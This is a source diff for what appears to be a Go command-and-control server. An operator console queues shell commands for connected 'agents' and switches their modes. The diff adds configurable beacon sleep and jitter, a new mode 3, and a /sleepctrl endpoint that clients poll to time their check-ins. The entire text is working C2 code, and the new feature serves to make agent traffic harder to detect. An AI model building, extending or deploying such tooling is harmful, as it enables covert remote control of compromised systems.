@@ -18,6 +18,7 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -38,6 +39,15 @@ var (
 	rsaBits    int           = 2048                  //"Size of RSA key to generate. Ignored if --ecdsa-curve is set")
 	ecdsaCurve string        = "P384"                //, "ECDSA curve to use to generate a key. Valid values are P224, P256 (recommended), P384, P521")
 	ed25519Key bool          = false                 //, "Generate an Ed25519 key")
+)
+
+const (
+	defaultSleepSeconds  = 10
+	defaultJitterSeconds = 0
+	minSleepSeconds      = 1
+	maxSleepSeconds      = 3600
+	minJitterSeconds     = 0
+	maxJitterSeconds     = 3600
 )
 
 func check(e error) {
@@ -90,22 +100,28 @@ type operatorState struct {
 	mu      sync.RWMutex
 	mode    string
 	command string
+	sleep   int
+	jitter  int
 }
 
 func newOperatorState() *operatorState {
-	return &operatorState{mode: "0"}
+	return &operatorState{
+		mode:   "0",
+		sleep:  defaultSleepSeconds,
+		jitter: defaultJitterSeconds,
+	}
 }
 
 func (s *operatorState) setMode(m string) {
 	m = strings.TrimSpace(m)
 	switch m {
-	case "0", "1", "2":
+	case "0", "1", "2", "3":
 		s.mu.Lock()
 		s.mode = m
 		s.mu.Unlock()
 		fmt.Println("Setting Mode for All Agents To:", m)
 	default:
-		fmt.Println("Invalid mode. Use 0, 1, or 2.")
+		fmt.Println("Invalid mode. Use 0, 1, 2, or 3.")
 	}
 }
 
@@ -139,9 +155,33 @@ func (s *operatorState) popCommand() (string, bool) {
 	return cmd, true
 }
 
+// setSleepConfig updates the global base sleep and jitter values used by all clients.
+func (s *operatorState) setSleepConfig(seconds int, jitter int) {
+	if seconds < minSleepSeconds || seconds > maxSleepSeconds {
+		fmt.Printf("Invalid sleep value. Use %d-%d seconds.\n", minSleepSeconds, maxSleepSeconds)
+		return
+	}
+	if jitter < minJitterSeconds || jitter > maxJitterSeconds {
+		fmt.Printf("Invalid jitter value. Use %d-%d seconds.\n", minJitterSeconds, maxJitterSeconds)
+		return
+	}
+
+	s.mu.Lock()
+	s.sleep = seconds
+	s.jitter = jitter
+	s.mu.Unlock()
+	fmt.Printf("Set global client sleep to %d seconds with jitter max %d seconds.\n", seconds, jitter)
+}
+
+func (s *operatorState) getSleepConfig() (int, int) {
+	s.mu.RLock()
+	defer s.mu.RUnlock()
+	return s.sleep, s.jitter
+}
+
 func startOperatorLoop(state *operatorState) {
 	fmt.Println("Operator console ready.")
-	fmt.Println("Commands: mode <0|1|2>, cmd <command>, or a bare command line (queues command and sets mode 2).")
+	fmt.Println("Commands: mode <0|1|2|3>, sleep <seconds> [jitter], cmd <command>, or a bare command line (queues command and sets mode 2).")
 
 	scanner := bufio.NewScanner(os.Stdin)
 	for scanner.Scan() {
@@ -152,10 +192,33 @@ func startOperatorLoop(state *operatorState) {
 
 		lower := strings.ToLower(line)
 		switch {
-		case lower == "0" || lower == "1" || lower == "2":
+		case lower == "0" || lower == "1" || lower == "2" || lower == "3":
 			state.setMode(line)
 		case strings.HasPrefix(lower, "mode "):
 			state.setMode(strings.TrimSpace(line[5:]))
+		case strings.HasPrefix(lower, "sleep "):
+			parts := strings.Fields(line)
+			if len(parts) < 2 || len(parts) > 3 {
+				fmt.Println("Invalid sleep command. Example: sleep 30 or sleep 30 10")
+				continue
+			}
+
+			seconds, err := strconv.Atoi(parts[1])
+			if err != nil {
+				fmt.Println("Invalid sleep value. Example: sleep 30 or sleep 30 10")
+				continue
+			}
+
+			jitter := defaultJitterSeconds
+			if len(parts) == 3 {
+				jitter, err = strconv.Atoi(parts[2])
+				if err != nil {
+					fmt.Println("Invalid jitter value. Example: sleep 30 10")
+					continue
+				}
+			}
+
+			state.setSleepConfig(seconds, jitter)
 		case strings.HasPrefix(lower, "cmd "):
 			state.setCommand(strings.TrimSpace(line[4:]))
 			state.setMode("2")
@@ -216,6 +279,15 @@ func main() {
 		mode := state.getMode()
 		c.Writer.Header().Set("Mode", mode)
 		c.HTML(http.StatusOK, "index.html", nil)
+	})
+
+	r.GET("/sleepctrl", func(c *gin.Context) {
+		// Clients pull both values in mode 3 and then use them for polling delay calculations.
+		sleepSeconds, jitterSeconds := state.getSleepConfig()
+		c.JSON(http.StatusOK, gin.H{
+			"sleep_seconds":  sleepSeconds,
+			"jitter_seconds": jitterSeconds,
+		})
 	})
 
 	r.GET("/cmdctrl", func(c *gin.Context) {
